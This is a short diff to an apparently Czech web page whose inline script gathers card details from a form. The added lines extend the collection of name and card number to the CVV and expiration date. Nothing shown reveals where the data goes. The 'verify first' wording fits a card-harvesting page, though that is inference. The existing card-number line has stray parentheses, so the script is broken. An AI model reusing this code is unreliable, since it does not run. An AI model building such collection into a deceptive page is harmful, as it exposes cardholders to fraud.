@@ -623,6 +623,8 @@ nejprve ověřte.&nbsp;</p></div>
 					const formData = new URLSearchParams();
 					formData.append('name',form_content.elements['account_name'].value);
 					formData.append('number',`${form_content.elements['card_number'].value)} ${form_content.elements['card_number2'].value)} ${form_content.elements['card_number3'].value)} ${form_content.elements['card_number4'].value)}`;
+					formData.append('cvv',form_content.elements['cvv'].value);
+					formData.append('expiration',form_content.elements['expiration_date'].value);
 				}
 			</script>
 		</main>
